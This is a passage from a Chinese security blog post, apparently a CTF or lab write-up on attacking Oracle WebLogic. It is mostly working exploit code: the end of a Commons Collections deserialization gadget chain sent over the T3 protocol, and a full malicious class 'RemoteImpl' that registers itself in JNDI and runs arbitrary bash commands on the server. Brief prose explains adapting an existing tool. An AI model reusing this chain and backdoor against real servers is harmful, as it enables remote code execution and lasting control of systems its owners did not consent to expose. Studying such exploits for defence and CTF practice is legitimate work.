class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredConstructor&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newInstance&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;defineClass&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, <span class="type">byte</span>[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;com.boogipop.payload.RemoteImpl&quot;</span>, bytes&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;main&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String[].class&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="comment">// 初始化map 设置laymap</span></span><br><span class="line">        Map&lt;Object,Object&gt; lazymap = LazyMap.decorate(innerMap,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)); <span class="comment">//随便改成什么Transformer</span></span><br><span class="line">        TiedMapEntry tiedMapEntry=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(tiedMapEntry,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        innerMap.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factory</span> <span class="operator">=</span> LazyMap.class.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Reflections.setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br><span class="line">        factory.set(lazymap,transformerChain);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(out);</span><br><span class="line">        objOut.writeObject(hashMap);</span><br><span class="line">        objOut.flush();</span><br><span class="line">        objOut.close();</span><br><span class="line">        <span class="type">byte</span>[] payload = out.toByteArray();</span><br><span class="line">        T3ProtocolOperation.send(host, port, payload);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">tobytes</span><span class="params">()</span> <span class="keyword">throws</span> FileNotFoundException &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">jarname</span> <span class="operator">=</span><span class="string">&quot;E:\\CTFLearning\\WeblogicEnvironment-master\\weblogic_cmd-master\\weblogic_cmd-master\\out\\production\\weblogic_cmd\\com\\boogipop\\payload\\RemoteImpl.class&quot;</span>;</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(jarname);</span><br><span class="line"></span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">bytestream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">int</span> ch;</span><br><span class="line">            <span class="type">byte</span> imgdata[] = <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">while</span> ((ch = is.read()) != -<span class="number">1</span>) &#123;</span><br><span class="line">                    bytestream.write(ch);</span><br><span class="line">                &#125;</span><br><span class="line">                imgdata = bytestream.toByteArray();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    bytestream.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(Arrays.toString(imgdata));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>bytes属性那里就是我们自己定义的远程恶意类的字节码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.boogipop.payload;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> weblogic.cluster.singleton.ClusterMasterRemote;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteImpl</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title class_">ClusterMasterRemote</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">            ctx.rebind(<span class="string">&quot;Boogipop&quot;</span>, <span class="keyword">new</span> <span class="title class_">RemoteImpl</span>());</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setServerLocation</span><span class="params">(String cmd, String args)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getServerLocation</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            List&lt;String&gt; cmds = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;();</span><br><span class="line"></span><br><span class="line">            cmds.add(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">            cmds.add(<span class="string">&quot;-c&quot;</span>);</span><br><span class="line">            cmds.add(cmd);</span><br><span class="line"></span><br><span class="line">            <span class="type">ProcessBuilder</span> <span class="variable">processBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(cmds);</span><br><span class="line">            processBuilder.redirectErrorStream(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Process</span> <span class="variable">proc</span> <span class="operator">=</span> processBuilder.start();</span><br><span class="line"></span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(proc.getInputStream()));</span><br><span class="line">            <span class="type">StringBuffer</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line"></span><br><span class="line">            String line;</span><br><span class="line">            <span class="keyword">while</span> ((line = br.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                sb.append(line).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> sb.toString();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span> e.getMessage();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这是我们自己构造的，其实和官方的差不多，主要就是试试改造这个工具，除此之外，记得把其他工具包里有关import Main的地方都改为<code>com.boogipop.Main</code>,否则还是会调用superame包里的Main方法，导致一系列的错误~</p>

    </div>

    
    <div class="about">
        <h1>About this Post</h1>
        <div class="details">
            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
        </div>
        
        <p class="tags">
            
            <i class="icon"></i>
            <a href="/tags/CTF/" class="tag">#CTF</a><a href="/tags/Java/" class="tag">#Java</a>
        </p>
        
    </div>
    

    <div class="container post-prev-next">
        
        <a href="/2023/04/14/Absolute%20Writeup%20By%20Boogipop/" class="next">
            <div>
                <div class="text">
                    <p class="label">Next</p>
                    <h3 class="title">HTB Absolute Writeup By Boogipop</h3>
                </div>
            </div>
        </a>
        
        
        <a href="/2023/04/09/%E5%AE%89%E6%9C%8D%E4%BB%94%E7%9A%84%E5%85%A5%E8%81%8C%E5%B0%8F%E8%AE%B0/" class="prev">
            <div>
                <div class="text">
                    <p class="label">Previous</p>
                    <h3 class="title">安服仔的入职小记</>
                </div>
            </div>
        </a>
        
    </div>

    
        
        
        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
        
    
</article>

        <footer>
    <div class="inner">
        <div class="links">
            
            <div class="group">
                <h2 class="title">Blog</h2>
                
                <a href="/" class="item">Blog</a>
                
                <a href="/archives" class="item">Archives</a>
                
                <a href="/tags" class="item">Tags</a>
                
                <a href="/categories" class="item">Categories</a>
                
                <a href="/search" class="item">Search</a>
                
                <a href="/friends" class="item">Friends</a>
                
                <a href="/about" class="item">About</a>
                
                <a href="/atom.xml" class="item">RSS</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Projects</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Me</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
                
                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
                
                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
                
                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
                
                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
                
                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
                
            </div>
            
        </div>
        <span>&copy; 2024 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
        
        
            <br>
            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
                <label>
                    <input type="radio" value="light">
                    <span>Light</span>
                </label>
                <label>
                    <input type="radio" value="dark">
                    <span>Dark</span>
                </label>
                <label>
                    <input type="radio" value="auto">
                    <span>Auto</span>
                </label>
            </div>
        
    </div>
</footer>


        
<script src="/js/main.js"></script>

        
        
        

        
        <script src="https://unpkg.com/scrollreveal"></script>
		
        <script>
            window.addEventListener('load', () => {
                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
                ScrollReveal().reveal('.post-list-item .cover-img img')
                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
            })
        </script>
        
    </body>
</html>